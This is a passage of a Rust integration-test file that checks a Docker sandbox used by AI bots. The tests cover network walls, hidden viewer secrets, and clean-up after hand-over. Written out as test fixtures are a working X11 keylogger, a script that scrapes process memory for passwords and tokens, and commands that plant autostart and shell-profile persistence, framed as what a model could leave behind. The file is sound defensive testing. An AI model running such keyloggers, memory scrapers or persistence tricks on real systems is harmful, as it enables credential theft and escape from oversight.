//! Against the real daemon and the real image: `cargo test -p buwiz-computer --test real_docker
//! -- --ignored`. Ignored in a plain run, which may have no Docker. Asked for, it never skips: no
//! Docker or no image is a failure that says so.
//!
//! Its containers start with `c2t-`, and the only port on the Mac it tries is one it opened.

#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

use std::path::PathBuf;

use buwiz_computer::{DockerProvider, Gate, Input, Mode, Power, Provider, Screen, Sleep, Spec};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;

const IMAGE_ENV: &str = "BUWIZ_COMPUTER_IMAGE";

/// What a command in the box prints for each address: the Mac's way in, and the internet.
const REACH: &str = r#"
import socket, sys
port = int(sys.argv[1])
for host in sys.argv[2:]:
    s = socket.socket(); s.settimeout(3)
    try:
        s.connect((socket.gethostbyname(host), port)); print(host, 'REACHED')
    except Exception:
        print(host, 'blocked')
"#;

#[tokio::test(flavor = "multi_thread")]
#[ignore = "needs Docker and the computer image"]
async fn a_real_computer_wakes_walled_off_and_sleeps() {
    let image = std::env::var(IMAGE_ENV).unwrap_or_else(|_| "buwiz-computer:local".to_owned());
    let dir: PathBuf = std::env::temp_dir().join(format!("c2t-{}", std::process::id()));
    std::fs::create_dir_all(&dir).unwrap();
    let p = DockerProvider::new(image, "c2t");
    p.check().await.unwrap_or_else(|e| panic!("this test needs Docker and the image: {e}"));

    let m = p.create(&Spec { id: "cmp_c2test".into(), dir: dir.clone() }).await.unwrap();
    let outcome = tokio::spawn({
        let (m, dir) = (m.clone(), dir.clone());
        async move {
            let p = DockerProvider::new(std::env::var(IMAGE_ENV).unwrap_or_else(|_| "buwiz-computer:local".to_owned()), "c2t");
            drive(&p, &m, &dir).await
        }
    })
    .await;
    p.destroy(&m).await.unwrap();
    let _ = std::process::Command::new("docker").args(["network", "rm", "c2t-net"]).output();
    let _ = std::fs::remove_dir_all(&dir);
    outcome.unwrap();
}

async fn drive(p: &DockerProvider, m: &buwiz_computer::Machine, dir: &std::path::Path) {
    assert_eq!(p.power(m).await.unwrap(), Power::Asleep);
    p.wake(m).await.unwrap();
    assert_eq!(p.power(m).await.unwrap(), Power::Awake);
    assert_eq!(std::fs::read_dir(dir.join("start")).unwrap().count(), 0, "the secrets went after the start");

    let a = p.screen_up(m, "c2t_a").await.unwrap();
    let b = p.screen_up(m, "c2t_b").await.unwrap();
    assert_ne!(a.display, b.display);
    assert!(p.viewer(m, &a).await.unwrap().is_some());
    p.input(m, &a, &Input::Click { x: 10, y: 10, button: 1, double: false }).await.unwrap();
    assert!(p.screenshot(m, &b).await.unwrap().for_model().0.starts_with(&[0xFF, 0xD8]));

    // a fresh provider is a new broker: the guard walls it, and the box can't reach the Mac
    let again = DockerProvider::new(std::env::var(IMAGE_ENV).unwrap_or_else(|_| "buwiz-computer:local".to_owned()), "c2t");
    again.guard(m).await.unwrap();
    let mac = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let port = mac.local_addr().unwrap().port().to_string();
    let quoted = REACH.replace('\'', "'\\''");
    let cmd = format!("python3 -c '{quoted}' {port} host.docker.internal 192.168.65.254 gateway.docker.internal");
    let out = p.run(m, &a, &cmd, 20_000).await.unwrap();
    assert!(!out.stdout.contains("REACHED") && out.stdout.matches("blocked").count() == 3, "{}", out.stdout);
    let gateway = "python3 -c \"import socket,struct;f=[l.split() for l in open('/proc/net/route')][1:];g=[x[2] for x in f if x[1]=='00000000'][0];print(socket.inet_ntoa(struct.pack('<I',int(g,16))))\"";
    let gw = p.run(m, &a, gateway, 10_000).await.unwrap().stdout.trim().to_owned();
    let out = p.run(m, &a, &format!("python3 -c '{quoted}' 80 {gw}"), 10_000).await.unwrap();
    assert!(out.stdout.contains("blocked"), "the bridge gateway too: {}", out.stdout);
    let out = p.run(m, &a, "python3 -c \"import socket;s=socket.socket();s.settimeout(6);s.connect(('example.com',443));print('out')\"", 15_000).await.unwrap();
    assert!(out.stdout.contains("out"), "the internet stays: {}", out.stderr);

    // files, by the path the box resolves: what computer_read_file and computer_write_file send
    let path = format!("{}/notes/a.txt", a.folder);
    let real = p.resolve(m, &path).await.unwrap();
    assert_eq!(real, format!("/workspace/{path}"));
    p.write_file(m, &real, b"hello from c2").await.unwrap();
    assert_eq!(p.read_file(m, &real).await.unwrap(), b"hello from c2");
    p.run(m, &a, "ln -s /etc/hostname out", 5000).await.unwrap();
    assert_eq!(p.resolve(m, &format!("{}/out", a.folder)).await.unwrap(), "/etc/hostname", "a link resolves to where it leads");

    // box-exec ends a job's process group at 30 s: the browser must outlive that
    p.open_url(m, &a, "http://127.0.0.1:1/").await.unwrap();
    tokio::time::sleep(std::time::Duration::from_secs(36)).await;
    let alive = p.run(m, &a, "pgrep -c chromium", 10_000).await.unwrap();
    assert_ne!(alive.stdout.trim(), "0", "the browser died with its job");

    p.sleep(m, Sleep::Light).await.unwrap();
    assert_eq!(p.power(m).await.unwrap(), Power::Asleep);
    p.wake(m).await.unwrap();
    assert_eq!(p.power(m).await.unwrap(), Power::Awake);
    let alive = p.run(m, &a, "pgrep -c chromium", 10_000).await.unwrap();
    assert_ne!(alive.stdout.trim(), "0", "a light sleep keeps what's open");
    assert!(p.screenshot(m, &a).await.is_ok(), "published ports answer through the wall");
    // what a model could leave in the box's home: it runs at the next start, and the wall is
    // already up, because the box's network is older than the box. The Mac's loopback listens here.
    let plant = format!(
        r#"mkdir -p ~/.config/autostart; printf '%s\n' {autostart} > ~/.config/autostart/c2probe.desktop; printf '%s\n' {script} > ~/c2probe.py"#,
        autostart = "'[Desktop Entry]' 'Type=Application' 'Name=c2probe' 'Exec=python3 /home/box/c2probe.py'",
        script = shell_lines(&format!("import socket,time\nout=open('/workspace/c2probe.log','a')\nout.write('ran\\n')\nfor host,port in [('host.docker.internal',{port}),('192.168.65.254',{port}),('gateway.docker.internal',{port}),('example.com',443)]:\n    s=socket.socket();s.settimeout(3)\n    try:\n        s.connect((socket.gethostbyname(host),port));out.write(host+' REACHED\\n')\n    except Exception:\n        out.write(host+' blocked\\n')\nout.write('done\\n')\nout.close()\n")),
    );
    let planted = p.run(m, &a, &plant, 10_000).await.unwrap();
    assert_eq!(planted.exit_code, Some(0), "{}", planted.stderr);
    p.sleep(m, Sleep::Deep).await.unwrap();
    assert_eq!(p.power(m).await.unwrap(), Power::Asleep);
    p.wake(m).await.unwrap();
    let up = p.screen_up(m, "c2t_a").await.unwrap();
    assert_eq!(up.display, a.display, "a Bot keeps its screen's number");
    let mut log = String::new();
    for _ in 0..60 {
        log = p.run(m, &a, "cat /workspace/c2probe.log 2>/dev/null", 5000).await.unwrap().stdout;
        if log.contains("done") {
            break;
        }
        tokio::time::sleep(std::time::Duration::from_millis(500)).await;
    }
    println!("what the planted autostart reached:\n{log}");
    assert!(log.contains("ran") && log.contains("done"), "the planted file never ran: {log}");
    for host in ["host.docker.internal", "192.168.65.254", "gateway.docker.internal"] {
        assert!(log.contains(&format!("{host} blocked")), "{log}");
    }
    assert!(log.contains("example.com REACHED"), "it had the internet, so it did run with a network: {log}");
    assert!(tokio::time::timeout(std::time::Duration::from_millis(100), mac.accept()).await.is_err(), "the Mac's listener heard from the box");
}

/// `text`'s lines as shell words for `printf '%s\n'`.
fn shell_lines(text: &str) -> String {
    text.lines().map(|l| format!("'{}'", l.replace('\'', "'\\''"))).collect::<Vec<_>>().join(" ")
}

fn docker(args: &[&str]) -> String {
    let out = std::process::Command::new("docker").args(args).output().expect("docker");
    String::from_utf8_lossy(&out.stdout).trim().to_owned()
}

fn name_of(m: &buwiz_computer::Machine) -> String {
    match &m.reach {
        buwiz_computer::Reach::Container { name } => name.clone(),
        other => panic!("{other:?}"),
    }
}

/// Connects from `from`'s source port, or any, as a process in the box could.
fn reach(host: &str, port: u16, from: u16) -> String {
    format!("python3 -c \"import socket;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.settimeout(3);s.bind(('',{from}));\ntry:\n    s.connect(('{host}',{port}));print('REACHED')\nexcept Exception as e:\n    print('blocked',type(e).__name__)\"")
}

/// A network with no inter-container block of its own, so what's measured is the wall.
#[tokio::test(flavor = "multi_thread")]
#[ignore = "needs Docker and the computer image"]
async fn files_outlive_lost_containers_and_a_peer_cant_be_reached() {
    let image = std::env::var(IMAGE_ENV).unwrap_or_else(|_| "buwiz-computer:local".to_owned());
    let p = DockerProvider::new(image, "c2u");
    p.check().await.unwrap_or_else(|e| panic!("this test needs Docker and the image: {e}"));
    docker(&["network", "create", "c2u-net"]);
    let dirs: Vec<PathBuf> = ["cmp_c2ua", "cmp_c2ub"].iter().map(|d| std::env::temp_dir().join(format!("{d}-{}", std::process::id())).join(d)).collect();
    for d in &dirs {
        std::fs::create_dir_all(d).unwrap();
    }
    let a = p.create(&Spec { id: "cmp_c2ua".into(), dir: dirs[0].clone() }).await.unwrap();
    let b = p.create(&Spec { id: "cmp_c2ub".into(), dir: dirs[1].clone() }).await.unwrap();
    let outcome = tokio::spawn({
        let (a, b) = (a.clone(), b.clone());
        async move {
            let p = DockerProvider::new(std::env::var(IMAGE_ENV).unwrap_or_else(|_| "buwiz-computer:local".to_owned()), "c2u");
            lost_and_peers(&p, &a, &b).await
        }
    })
    .await;
    p.destroy(&a).await.unwrap();
    p.destroy(&b).await.unwrap();
    docker(&["network", "rm", "c2u-net"]);
    for d in &dirs {
        let _ = std::fs::remove_dir_all(d.parent().unwrap());
    }
    outcome.unwrap();
}

async fn lost_and_peers(p: &DockerProvider, a: &buwiz_computer::Machine, b: &buwiz_computer::Machine) {
    p.wake(a).await.unwrap();
    p.wake(b).await.unwrap();
    let (na, nb) = (name_of(a), name_of(b));
    let screen = p.screen_up(a, "c2u_a").await.unwrap();

    // the capabilities, as Docker holds them; the wall went up anyway
    assert!(docker(&["inspect", &format!("{na}-wall"), "--format", "{{.HostConfig.CapDrop}}"]).contains("ALL"));
    let caps = docker(&["inspect", &na, "--format", "{{.HostConfig.CapDrop}} {{.HostConfig.CapAdd}}"]);
    assert!(caps.contains("NET_RAW") && !caps.contains("NET_ADMIN"), "{caps}");

    // a peer on the same network, from any port and from an exempt one
    let peer = docker(&["inspect", &format!("{nb}-wall"), "--format", "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}"]);
    assert!(!peer.is_empty());
    let (any, exempt) = (reach(&peer, 1337, 0), reach(&peer, 1337, 6905));
    for (what, cmd) in [("any port", any), ("exempt port", exempt)] {
        let out = p.run(a, &screen, &cmd, 10_000).await.unwrap();
        println!("to a peer from {what}: {}", out.stdout.trim());
        // refused here, by this box's own wall: a timeout would mean the packet left it
        assert!(out.stdout.contains("blocked OSError"), "{what}: {} {}", out.stdout, out.stderr);
    }

    // files, through every way a container can go
    for (what, gone) in [("holder", vec![format!("{na}-wall")]), ("box", vec![na.clone()]), ("both", vec![na.clone(), format!("{na}-wall")])] {
        p.write_file(a, "kept.txt", what.as_bytes()).await.unwrap();
        for g in &gone {
            docker(&["rm", "-f", g]);
        }
        assert_ne!(p.power(a).await.unwrap() == Power::Absent, what == "holder", "only a missing box is a missing computer: {what}");
        p.wake(a).await.unwrap();
        assert_eq!(p.read_file(a, "kept.txt").await.unwrap(), what.as_bytes(), "{what}: the files went");
        println!("{what} removed by hand: files kept");
    }

    // a lost record: found by its label, with new secrets
    let dir = a.dir.clone();
    let found = p.recover(&Spec { id: "cmp_c2ua".into(), dir: dir.clone() }, None).await.unwrap().expect("it's still there");
    assert_eq!(found.reach, a.reach);
    assert_ne!(found.token, a.token);
    // as a click does: what's running has the old secrets, so it stops first
    p.sleep(&found, Sleep::Deep).await.unwrap();
    p.wake(&found).await.unwrap();
    assert_eq!(p.read_file(&found, "kept.txt").await.unwrap(), b"both");

    // record and containers both lost: the files are found by name
    docker(&["rm", "-f", &na, &format!("{na}-wall")]);
    assert_eq!(p.recover(&Spec { id: "cmp_c2ua".into(), dir: dir.clone() }, None).await.unwrap(), None, "a label needs a container");
    let found = p.recover(&Spec { id: "cmp_c2ua".into(), dir }, Some(&a.reach)).await.unwrap().expect("its volumes are there");
    p.wake(&found).await.unwrap();
    assert_eq!(p.read_file(&found, "kept.txt").await.unwrap(), b"both", "the files were left behind");
    println!("record and containers lost: files kept");

    // only the home volume left: that's files, and a delete still finishes on real Docker's words
    docker(&["rm", "-f", &na, &format!("{na}-wall")]);
    docker(&["volume", "rm", &format!("{na}-workspace")]);
    let dir = a.dir.clone();
    let home_only = p.recover(&Spec { id: "cmp_c2ua".into(), dir }, Some(&a.reach)).await.unwrap();
    assert!(home_only.is_some(), "a surviving home was read as nothing left");
    p.destroy(a).await.expect("a volume already gone stopped the removal");
    assert_eq!(docker(&["volume", "ls", "--quiet", "--filter", &format!("name={na}-home")]), "", "the other volume was left behind");
    println!("home alone: found, and a delete removed it");
}

/// What a page does to reach a ticket's screen: the ticket, then the socket, by the real gate.
async fn real_socket(gate: &Gate, bot: &str, viewer: buwiz_computer::Viewer, mode: Mode) -> (TcpStream, u16, String, String) {
    let url = gate.open(bot, viewer, mode).unwrap();
    let (port, target) = url.strip_prefix("http://127.0.0.1:").unwrap().split_once('/').unwrap();
    let (port, target) = (port.parse::<u16>().unwrap(), format!("/{target}"));
    let reply = http(port, &target, "").await;
    let cookie = reply.lines().find_map(|l| l.strip_prefix("Set-Cookie: ")).unwrap().split(';').next().unwrap().to_owned();
    let clean = target.split('?').next().unwrap().to_owned();
    let mut ws = TcpStream::connect(("127.0.0.1", port)).await.unwrap();
    ws.write_all(format!("GET {clean}ws HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\nCookie: {cookie}\r\nOrigin: http://127.0.0.1:{port}\r\nConnection: Upgrade\r\nUpgrade: websocket\r\nSec-WebSocket-Version: 13\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Extensions: permessage-deflate\r\n\r\n").as_bytes()).await.unwrap();
    let mut head = Vec::new();
    let mut byte = [0u8; 1];
    while !head.ends_with(b"\r\n\r\n") {
        ws.read_exact(&mut byte).await.unwrap();
        head.push(byte[0]);
    }
    let head = String::from_utf8_lossy(&head).into_owned();
    assert!(head.starts_with("HTTP/1.1 101"), "{head}");
    assert!(!head.to_lowercase().contains("sec-websocket-extensions"), "the gate couldn't read that: {head}");
    (ws, port, clean, cookie)
}

async fn http(port: u16, target: &str, cookie: &str) -> String {
    let mut s = TcpStream::connect(("127.0.0.1", port)).await.unwrap();
    let extra = if cookie.is_empty() { String::new() } else { format!("Cookie: {cookie}\r\n") };
    s.write_all(format!("GET {target} HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\n{extra}\r\n").as_bytes()).await.unwrap();
    let mut out = Vec::new();
    s.read_to_end(&mut out).await.unwrap();
    String::from_utf8_lossy(&out).into_owned()
}

fn command(text: &str) -> Vec<u8> {
    let mask = [7u8, 8, 9, 10];
    let mut out = vec![0x81, 0x80 | text.len() as u8];
    out.extend(mask);
    out.extend(text.bytes().enumerate().map(|(i, b)| b ^ mask[i % 4]));
    out
}

async fn pointer(p: &DockerProvider, m: &buwiz_computer::Machine, screen: &Screen) -> String {
    tokio::time::sleep(std::time::Duration::from_millis(400)).await;
    let out = p.run(m, screen, "xdotool getmouselocation --shell | head -2 | tr '\\n' ' '", 5000).await.unwrap();
    assert_eq!(out.exit_code, Some(0), "{}", out.stderr);
    out.stdout.trim().to_owned()
}

/// The real viewer, through the real gate: only the gate stands between a watcher and the desktop.
#[tokio::test(flavor = "multi_thread")]
#[ignore = "needs Docker and the computer image"]
async fn a_watcher_cant_touch_a_real_screen_and_a_driver_can() {
    let image = std::env::var(IMAGE_ENV).unwrap_or_else(|_| "buwiz-computer:local".to_owned());
    let dir: PathBuf = std::env::temp_dir().join(format!("c2w-{}", std::process::id()));
    std::fs::create_dir_all(&dir).unwrap();
    let p = DockerProvider::new(image.clone(), "c2w");
    p.check().await.unwrap_or_else(|e| panic!("this test needs Docker and the image: {e}"));
    let m = p.create(&Spec { id: "cmp_c2wtest".into(), dir: dir.clone() }).await.unwrap();
    let outcome = tokio::spawn({
        let m = m.clone();
        async move { watch_and_drive(&DockerProvider::new(image, "c2w"), &m).await }
    })
    .await;
    p.destroy(&m).await.unwrap();
    let _ = std::process::Command::new("docker").args(["network", "rm", "c2w-net"]).output();
    let _ = std::fs::remove_dir_all(&dir);
    outcome.unwrap();
}

async fn watch_and_drive(p: &DockerProvider, m: &buwiz_computer::Machine) {
    p.wake(m).await.unwrap();
    let a = p.screen_up(m, "c2w_a").await.unwrap();
    let b = p.screen_up(m, "c2w_b").await.unwrap();
    let gate = Gate::start().await.unwrap();
    let quiet = std::time::Duration::from_secs(2);
    let (a_viewer, b_viewer) = (p.viewer(m, &a).await.unwrap().unwrap(), p.viewer(m, &b).await.unwrap().unwrap());

    p.input(m, &a, &Input::Move { x: 40, y: 40 }).await.unwrap();
    p.input(m, &b, &Input::Move { x: 41, y: 41 }).await.unwrap();
    let (at_start, b_at_start) = (pointer(p, m, &a).await, pointer(p, m, &b).await);
    println!("before: {at_start} / {b_at_start}");
    assert!(at_start.contains("X=40") && b_at_start.contains("X=41"), "{at_start} {b_at_start}");

    let (mut ws, port, clean, cookie) = real_socket(&gate, "c2w_a", a_viewer.clone(), Mode::Watch).await;
    for path in ["", "client.js", "worker.js", "audio.js", "mic.js", "inter.woff2", "favicon.ico"] {
        let page = http(port, &format!("{clean}{path}"), &cookie).await;
        assert!(page.starts_with("HTTP/1.1 200"), "{path}: {}", page.lines().next().unwrap_or_default());
    }
    for path in ["screenshot", "stats", "wait?idle=1", "files/list"] {
        assert!(http(port, &format!("{clean}{path}"), &cookie).await.starts_with("HTTP/1.1 403"), "{path}");
    }
    ws.write_all(&command("m,300,200")).await.unwrap();
    ws.write_all(&command("b,1,1")).await.unwrap();
    ws.write_all(&command("b,1,0")).await.unwrap();
    ws.write_all(&command("po,1")).await.unwrap();
    assert_eq!(pointer(p, m, &a).await, at_start, "a watcher moved the real pointer");
    assert!(!gate.driving("c2w_a", quiet));

    let (mut ws, ..) = real_socket(&gate, "c2w_a", a_viewer, Mode::Drive).await;
    assert!(!gate.driving("c2w_a", quiet), "connected and quiet");
    ws.write_all(&command("m,300,200")).await.unwrap();
    let driven = pointer(p, m, &a).await;
    println!("driven: {driven}");
    assert!(driven.contains("X=300") && driven.contains("Y=200"), "a driver's input didn't reach the desktop: {driven}");
    assert_eq!(pointer(p, m, &b).await, b_at_start, "another Bot's screen moved");
    assert!(gate.driving("c2w_a", std::time::Duration::from_secs(30)), "the gate didn't see them");
    assert!(!gate.driving("c2w_b", std::time::Duration::from_secs(30)));

    // another Bot's ticket is another Bot's: it reaches its own screen and no other
    let (mut other, ..) = real_socket(&gate, "c2w_b", b_viewer, Mode::Drive).await;
    other.write_all(&command("m,100,120")).await.unwrap();
    assert!(pointer(p, m, &b).await.contains("X=100"));
    assert!(pointer(p, m, &a).await.contains("X=300"));

    // gone from the gate, gone from the viewer
    gate.close("c2w_a");
    drop(ws);
    for _ in 0..200 {
        if !gate.driving("c2w_a", std::time::Duration::from_secs(30)) {
            return;
        }
        tokio::time::sleep(std::time::Duration::from_millis(10)).await;
    }
    panic!("a closed session still counts as driving");
}

/// Hunts for `needle` (read from a file, so it's on no command line) in every process it can read,
/// and tries the viewers with no password. What it prints names no secret.
const HUNT: &str = r#"
import glob, os, re, socket, sys
needles = [l.strip().encode() for l in open(sys.argv[1]) if l.strip()]
os.remove(sys.argv[1])
me = {os.getpid(), os.getppid()}
for p in ['/run/buwiz-computer/viewer', '/run/buwiz-computer/token']:
    try:
        print(p, 'READ', len(open(p).read()))
    except Exception as e:
        print(p, 'unreadable', type(e).__name__)
print('dir', os.path.isdir('/run/buwiz-computer') and sorted(os.listdir('/run/buwiz-computer')))
for pid in sorted(int(d) for d in os.listdir('/proc') if d.isdigit()):
    if pid in me:
        continue
    for name in ['environ', 'cmdline']:
        try:
            data = open(f'/proc/{pid}/{name}', 'rb').read()
            if any(n in data for n in needles):
                print('FOUND', pid, name)
        except Exception:
            pass
    try:
        maps = open(f'/proc/{pid}/maps').read().splitlines()
        mem = open(f'/proc/{pid}/mem', 'rb', 0)
    except Exception:
        continue
    for line in maps:
        lo, hi = [int(x, 16) for x in line.split()[0].split('-')]
        if 'r' not in line.split()[1] or hi - lo > 1 << 28:
            continue
        try:
            mem.seek(lo)
            data = mem.read(hi - lo)
            if any(n in data for n in needles):
                print('FOUND', pid, 'mem', open(f'/proc/{pid}/comm').read().strip())
                break
        except Exception:
            pass
for port in sys.argv[2:]:
    for path, extra in [('/', ''), ('/screenshot', ''), ('/ws', 'Connection: Upgrade\r\nUpgrade: websocket\r\nSec-WebSocket-Version: 13\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n')]:
        s = socket.create_connection(('127.0.0.1', int(port)), 3)
        s.sendall(f'GET {path} HTTP/1.1\r\nHost: 127.0.0.1\r\n{extra}\r\n'.encode())
        s.settimeout(3)
        print('port', port, path, s.recv(64).split(b'\r\n')[0].decode(errors='replace'))
"#;

/// What a planted autostart would do at a start: read the staged files as fast as it can.
const EARLY: &str = "import os,time\nout=open('/workspace/c2early.log','a')\nout.write('began %.3f\\n'%time.time());out.flush()\nend=time.time()+20\nhit=0\nseen=0\nn=0\nwhile time.time()<end:\n    n+=1\n    for p in ['/run/buwiz-computer/viewer','/run/buwiz-computer/token']:\n        try:\n            if os.path.exists(p):\n                seen+=1\n            d=open(p).read()\n            if d:\n                hit+=1\n                out.write('READ '+p+' '+str(len(d))+' after '+str(n)+'\\n');out.flush()\n        except Exception as e:\n            pass\n    time.sleep(0.002)\nout.write('done hits='+str(hit)+' seen='+str(seen)+' tries='+str(n)+'\\n');out.close()\n";

/// From inside, as `computer_run` is: the secrets can't be read, by file or from any process, and
/// the viewers answer nothing without them. Not at a start either, for something planted to run then.
#[tokio::test(flavor = "multi_thread")]
#[ignore = "needs Docker and the computer image"]
async fn a_box_process_cant_get_the_viewer_password_or_past_the_viewer() {
    let image = std::env::var(IMAGE_ENV).unwrap_or_else(|_| "buwiz-computer:local".to_owned());
    let dir: PathBuf = std::env::temp_dir().join(format!("c2s-{}", std::process::id()));
    std::fs::create_dir_all(&dir).unwrap();
    let p = DockerProvider::new(image.clone(), "c2s");
    p.check().await.unwrap_or_else(|e| panic!("this test needs Docker and the image: {e}"));
    let m = p.create(&Spec { id: "cmp_c2stest".into(), dir: dir.clone() }).await.unwrap();
    let outcome = tokio::spawn({
        let m = m.clone();
        async move { hunt(&DockerProvider::new(image, "c2s"), &m).await }
    })
    .await;
    p.destroy(&m).await.unwrap();
    let _ = std::process::Command::new("docker").args(["network", "rm", "c2s-net"]).output();
    let _ = std::fs::remove_dir_all(&dir);
    outcome.unwrap();
}

async fn hunt(p: &DockerProvider, m: &buwiz_computer::Machine) {
    p.wake(m).await.unwrap();
    let a = p.screen_up(m, "c2s_a").await.unwrap();
    let control = "c2s-control-value-held-in-memory";
    let needles = format!("{}\n{}\n{control}\n", m.viewer_password.expose(), m.token.expose());
    p.write_file(m, "needles", needles.as_bytes()).await.unwrap();
    // the hunt must be able to find what's there: an ordinary process holds this, built at run time
    let holder = r#"setsid nohup python3 -c "x='c2s-control-'+'value-held-in-memory'.strip();import time;time.sleep(60)" >/dev/null 2>&1 &"#;
    assert_eq!(p.run(m, &a, holder, 5000).await.unwrap().exit_code, Some(0));
    tokio::time::sleep(std::time::Duration::from_millis(500)).await;
    let quoted = HUNT.replace('\'', "'\\''");
    let out = p.run(m, &a, &format!("python3 -c '{quoted}' /workspace/needles 6901 {}", a.viewer_port), 60_000).await.unwrap();
    println!("the hunt:\n{}\n{}", out.stdout, out.stderr);
    assert_eq!(out.exit_code, Some(0), "{}", out.stderr);
    let found: Vec<&str> = out.stdout.lines().filter(|l| l.starts_with("FOUND")).collect();
    assert_eq!(found.len(), 1, "one find, the control's: {found:?}");
    assert!(found[0].contains("python3"), "the hunt can't read memory, or found a secret: {found:?}");
    let tree = p.run(m, &a, "ps -eo pid,ppid,pgid,sid,uid,comm,args --forest | cut -c1-120", 5000).await.unwrap().stdout;
    println!("{tree}");
    assert!(!out.stdout.contains(" READ "), "a secret can be read from its file");
    let ports: Vec<&str> = out.stdout.lines().filter(|l| l.starts_with("port ")).collect();
    assert_eq!(ports.len(), 6, "{}", out.stdout);
    for line in ports {
        assert!(line.contains(" 401"), "a viewer answered with no password: {line}");
    }

    // planted to run at a start, in every place a start reads from the home that outlives it
    let plant = format!(
        r#"mkdir -p ~/.config/autostart; printf '%s\n' '[Desktop Entry]' 'Type=Application' 'Name=c2early' 'Exec=python3 /home/box/c2early.py' > ~/.config/autostart/c2early.desktop; printf '%s\n' {script} > ~/c2early.py; printf 'python3 /home/box/c2early.py &\n' | tee -a ~/.bashrc ~/.profile ~/.xsessionrc >/dev/null"#,
        script = shell_lines(EARLY),
    );
    assert_eq!(p.run(m, &a, &plant, 10_000).await.unwrap().exit_code, Some(0));
    p.sleep(m, Sleep::Deep).await.unwrap();
    let began = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_secs_f64();
    p.wake(m).await.unwrap();
    let woke = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_secs_f64();
    println!("wake began {began:.3}, secrets gone by {woke:.3}");
    p.screen_up(m, "c2s_a").await.unwrap();
    let mut log = String::new();
    for _ in 0..60 {
        log = p.run(m, &a, "cat /workspace/c2early.log 2>/dev/null", 5000).await.unwrap().stdout;
        if log.contains("done") {
            break;
        }
        tokio::time::sleep(std::time::Duration::from_millis(500)).await;
    }
    println!("planted at a start:\n{log}");
    assert!(log.contains("done"), "the planted reader never ran: {log}");
    assert!(!log.contains("READ"), "something planted read a staged secret at a start: {log}");
}

/// A keylogger as a command could leave one: XInput2 raw key events on the root, over the X socket.
const KEYLOGGER: &str = r#"
import socket, struct, sys, time
log = open(sys.argv[2], 'a', buffering=1)
s = socket.socket(socket.AF_UNIX); s.connect('/tmp/.X11-unix/X' + sys.argv[1].lstrip(':'))
s.sendall(struct.pack('<BxHHHHxx', 0x6c, 11, 0, 0, 0))
def rd(n):
    b = b''
    while len(b) < n:
        c = s.recv(n - len(b))
        if not c:
            sys.exit(0)
        b += c
    return b
h = rd(8); d = rd(struct.unpack('<H', h[6:8])[0] * 4)
root = struct.unpack('<I', d[32 + ((struct.unpack('<H', d[16:18])[0] + 3) & ~3) + 8 * d[21]:][:4])[0]
name = b'XInputExtension'; pad = (-len(name)) % 4
s.sendall(struct.pack('<BxHHxx', 98, 2 + (len(name) + pad) // 4, len(name)) + name + b'\0' * pad)
major = rd(32)[9]
s.sendall(struct.pack('<BBHHH', major, 47, 2, 2, 2)); rd(32)
s.sendall(struct.pack('<BBHIHxx', major, 46, 5, root, 1) + struct.pack('<HH', 1, 1) + struct.pack('<I', 1 << 13))
log.write('ready\n')
while True:
    e = rd(32)
    if e[0] == 35:
        extra = struct.unpack('<I', e[4:8])[0]
        if extra:
            rd(extra * 4)
        log.write('key %d\n' % struct.unpack('<I', e[16:20])[0])
"#;

/// What a hand-over clears: what commands left, wherever it hides, and none of the desktop.
#[tokio::test(flavor = "multi_thread")]
#[ignore = "needs Docker and the computer image"]
async fn clearing_ends_what_commands_left_and_spares_the_desktop() {
    let image = std::env::var(IMAGE_ENV).unwrap_or_else(|_| "buwiz-computer:local".to_owned());
    let dir: PathBuf = std::env::temp_dir().join(format!("c2k-{}", std::process::id()));
    std::fs::create_dir_all(&dir).unwrap();
    let p = DockerProvider::new(image.clone(), "c2k");
    p.check().await.unwrap_or_else(|e| panic!("this test needs Docker and the image: {e}"));
    let m = p.create(&Spec { id: "cmp_c2ktest".into(), dir: dir.clone() }).await.unwrap();
    let outcome = tokio::spawn({
        let m = m.clone();
        async move { clear(&DockerProvider::new(image, "c2k"), &m).await }
    })
    .await;
    p.destroy(&m).await.unwrap();
    let _ = std::process::Command::new("docker").args(["network", "rm", "c2k-net"]).output();
    let _ = std::fs::remove_dir_all(&dir);
    outcome.unwrap();
}

async fn clear(p: &DockerProvider, m: &buwiz_computer::Machine) {
    p.wake(m).await.unwrap();
    let a = p.screen_up(m, "c2k_a").await.unwrap();
    // something planted to start with the desktop, under its session: spared by nothing
    let plant = "mkdir -p ~/.config/autostart; printf '%s\\n' '[Desktop Entry]' 'Type=Application' 'Name=c2plant' 'Exec=python3 -c \"import time;time.sleep(600)\"' > ~/.config/autostart/c2plant.desktop";
    assert_eq!(p.run(m, &a, plant, 5000).await.unwrap().exit_code, Some(0));
    p.sleep(m, Sleep::Deep).await.unwrap();
    p.wake(m).await.unwrap();
    let a = p.screen_up(m, "c2k_a").await.unwrap();
    p.run(m, &a, "rm ~/.config/autostart/c2plant.desktop", 5000).await.unwrap();
    p.open_url(m, &a, "http://127.0.0.1:1/").await.unwrap();
    tokio::time::sleep(std::time::Duration::from_secs(3)).await;

    p.write_file(m, "kl.py", KEYLOGGER.as_bytes()).await.unwrap();
    let left = format!(
        "setsid nohup python3 /workspace/kl.py {} /workspace/keys.log >/dev/null 2>&1 & setsid nohup sh -c 'while true; do sleep 0.05 & done' >/dev/null 2>&1 & VOXL_PASSWORD=$(head -c 24 /dev/urandom | od -An -tx1 | tr -d ' \\n') DISPLAY={} setsid nohup voxl --addr=127.0.0.1 --port=7000 >/dev/null 2>&1 & cp /usr/bin/python3 /workspace/innocent; setsid nohup /workspace/innocent -c 'import time;time.sleep(600)' >/dev/null 2>&1 &",
        a.display, a.display
    );
    assert_eq!(p.run(m, &a, &left, 5000).await.unwrap().exit_code, Some(0));
    tokio::time::sleep(std::time::Duration::from_secs(1)).await;
    let before = p.run(m, &a, "ps -eo pid,ppid,comm --forest | cut -c1-70", 5000).await.unwrap().stdout;
